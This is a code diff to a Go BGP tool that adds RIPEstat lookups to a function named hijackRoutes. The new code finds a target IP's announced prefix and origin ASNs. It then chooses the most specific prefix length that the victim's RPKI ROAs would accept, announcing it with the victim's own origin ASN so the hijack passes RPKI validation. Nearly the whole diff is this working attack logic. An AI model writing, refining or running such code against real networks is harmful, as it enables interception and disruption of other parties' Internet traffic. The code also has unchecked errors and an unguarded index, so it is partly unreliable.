@@ -22,7 +22,8 @@ const (
 
 type RipeResponse struct {
 	Data struct {
-		Resource string `json:"resource"`
+		ASNs   []string `json:"asns"`
+		Prefix string   `json:"prefix"`
 	} `json:"data"`
 }
 
@@ -35,11 +36,75 @@ type Config struct {
 	Community string `json:"community"`
 }
 
+type RipeRpkiResponse struct {
+	Data struct {
+		Status         string `json:"status"`
+		ValidatingROAs []struct {
+			Origin     string `json:"origin"`
+			Prefix     string `json:"prefix"`
+			MaxLength  int    `json:"max_length"`
+			Validity   string `json:"validity"`
+		} `json:"validating_roas"`
+	} `json:"data"`
+}
+
 var config Config
 
-func getCurrentPrefixLengthFromRipe(ip string) (uint32, error) {
+func getCurrentPrefixInfoFromRipe(ip string) (uint32, []uint32, error) {
 	// Construct the API URL
-	url := fmt.Sprintf("https://stat.ripe.net/data/prefix-overview/data.json?resource=%s", ip)
+	url := fmt.Sprintf("https://stat.ripe.net/data/network-info/data.json?resource=%s", ip)
+	fmt.Printf("[DEBUG] Calling RIPE Network Info API: %s\n", url)
+
+	// Make the HTTP request
+	resp, err := http.Get(url)
+	if err != nil {
+		return 0, nil, fmt.Errorf("failed to call RIPE API: %v", err)
+	}
+	defer resp.Body.Close()
+
+	// Check response status
+	if resp.StatusCode != http.StatusOK {
+		return 0, nil, fmt.Errorf("RIPE API returned non-200 status: %d", resp.StatusCode)
+	}
+
+	// Parse the JSON response
+	var ripeResp RipeResponse
+	if err := json.NewDecoder(resp.Body).Decode(&ripeResp); err != nil {
+		return 0, nil, fmt.Errorf("failed to parse RIPE API response: %v", err)
+	}
+
+	// Print the ASNs and prefix
+	fmt.Printf("[DEBUG] Current DFZ: %s with origin %s\n", ripeResp.Data.Prefix, ripeResp.Data.ASNs)
+
+	// Extract prefix length from the prefix string (e.g., "103.147.22.0/24" -> 24)
+	parts := strings.Split(ripeResp.Data.Prefix, "/")
+	if len(parts) != 2 {
+		return 0, nil, fmt.Errorf("invalid prefix format: %s", ripeResp.Data.Prefix)
+	}
+
+	prefixLen, err := strconv.ParseUint(parts[1], 10, 32)
+	if err != nil {
+		return 0, nil, fmt.Errorf("invalid prefix length: %s", parts[1])
+	}
+
+	// Parse all ASNs from the list
+	var asns []uint32
+	for _, asnStr := range ripeResp.Data.ASNs {
+		asnNum, err := strconv.ParseUint(asnStr, 10, 32)
+		if err != nil {
+			return 0, nil, fmt.Errorf("invalid ASN format: %s", asnStr)
+		}
+		asns = append(asns, uint32(asnNum))
+	}
+	fmt.Printf("[DEBUG] Parsed ASNs: %v\n", asns)
+
+	return uint32(prefixLen), asns, nil
+}
+
+func getCurrentRpkiInfoFromRipe(prefix string, asn uint32) (uint32, error) {
+	// Construct the API URL
+	url := fmt.Sprintf("https://stat.ripe.net/data/rpki-validation/data.json?resource=%d&prefix=%s", asn, prefix)
+	fmt.Printf("[DEBUG] Calling RIPE RPKI Validation API: %s\n", url)
 
 	// Make the HTTP request
 	resp, err := http.Get(url)
@@ -54,23 +119,32 @@ func getCurrentPrefixLengthFromRipe(ip string) (uint32, error) {
 	}
 
 	// Parse the JSON response
-	var ripeResp RipeResponse
+	var ripeResp RipeRpkiResponse
 	if err := json.NewDecoder(resp.Body).Decode(&ripeResp); err != nil {
 		return 0, fmt.Errorf("failed to parse RIPE API response: %v", err)
 	}
 
-	// Extract prefix length from the resource string (e.g., "103.147.22.0/24" -> 24)
-	parts := strings.Split(ripeResp.Data.Resource, "/")
-	if len(parts) != 2 {
-		return 0, fmt.Errorf("invalid resource format: %s", ripeResp.Data.Resource)
+	// Print RPKI validation information
+	fmt.Printf("[DEBUG] RPKI Validation Response - Status: %s\n", ripeResp.Data.Status)
+	
+	// Find the maximum prefix length from valid ROAs
+	var maxLength uint32
+	if len(ripeResp.Data.ValidatingROAs) > 0 {
+		fmt.Println("[DEBUG] Validating ROAs:")
+		for _, roa := range ripeResp.Data.ValidatingROAs {
+			fmt.Printf("[DEBUG]   Origin: %s, Prefix: %s, Max Length: %d, Validity: %s\n", 
+				roa.Origin, roa.Prefix, roa.MaxLength, roa.Validity)
+			
+			// Update maxLength if this ROA is valid and has a larger max length
+			if roa.Validity == "valid" && uint32(roa.MaxLength) > maxLength {
+				maxLength = uint32(roa.MaxLength)
+			}
+		}
+	} else {
+		fmt.Println("[DEBUG] No validating ROAs found")
 	}
 
-	prefixLen, err := strconv.ParseUint(parts[1], 10, 32)
-	if err != nil {
-		return 0, fmt.Errorf("invalid prefix length: %s", parts[1])
-	}
-
-	return uint32(prefixLen), nil
+	return maxLength, nil
 }
 
 func loadConfig() error {
@@ -247,10 +321,37 @@ func clearRoutes(client api.GobgpApiClient, ctx context.Context) error {
 	return nil
 }
 
-func determinePrefixLength(ip string) (uint32, error) {
+func determinePrefixStrategy(ip string) (uint32, uint32, error) {
 	// Check if it's an IPv4 address
-	return 32, nil
-	return 0, fmt.Errorf("invalid IP address format: %s", ip)
+	prefixLen, asns, err := getCurrentPrefixInfoFromRipe(ip)
+
+	var strategyAsn uint32
+	var strategyLen uint32
+	if prefixLen < 24 {
+		fmt.Println("Current announcement is less than 24, more specific announcement is possible to be used")
+		// Check RPKI validation for each ASN
+		prefix := fmt.Sprintf("%s/%d", ip, prefixLen)
+		for _, asn := range asns {
+			maxRpkiLength, err := getCurrentRpkiInfoFromRipe(prefix, asn)
+			if err != nil {
+				fmt.Printf("[WARN] Failed to get RPKI info for ASN %d: %v\n", asn, err)
+				continue
+			}
+
+			for i := prefixLen; i <= maxRpkiLength; i++ {
+				prefix := fmt.Sprintf("%s/%d", ip, i)
+				fmt.Printf("Vailded prefix: %s with origin %d\n", prefix, asn)
+			}
+			strategyLen = maxRpkiLength
+			strategyAsn = asn
+		}
+	} else {
+		fmt.Printf("[DEBUG] Current announcement is 24\n")
+		strategyAsn = asns[0]
+		strategyLen = prefixLen
+	}
+
+	return strategyLen, strategyAsn, err
 }
 
 func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dryrun bool, prefixLenOverride ...uint32) error {
@@ -265,15 +366,16 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 		return fmt.Errorf("failed to get neighbors: %v", err)
 	}
 
-	// Determine prefix length for the target IP
+	// Determine prefix strategy for the target IP
 	var prefixLen uint32
+	var asn uint32
 	var err2 error
 	if len(prefixLenOverride) > 0 {
 		prefixLen = prefixLenOverride[0]
 	} else {
-		prefixLen, err2 = determinePrefixLength(ip)
+		prefixLen, asn, err2 = determinePrefixStrategy(ip)
 		if err2 != nil {
-			return fmt.Errorf("failed to determine prefix length: %v", err2)
+			return fmt.Errorf("failed to determine prefix strategy: %v", err2)
 		}
 	}
 
@@ -289,8 +391,8 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 			peer.Peer.State.SessionState)
 
 		if dryrun {
-			fmt.Printf("[DRYRUN] Would add route %s/%d to %s\n", 
-				ip, prefixLen, peer.Peer.Conf.NeighborAddress)
+			fmt.Printf("[DRYRUN] Would add route %s/%d with origin %d to %s\n", 
+				ip, prefixLen, asn, peer.Peer.Conf.NeighborAddress)
 			continue
 		}
 
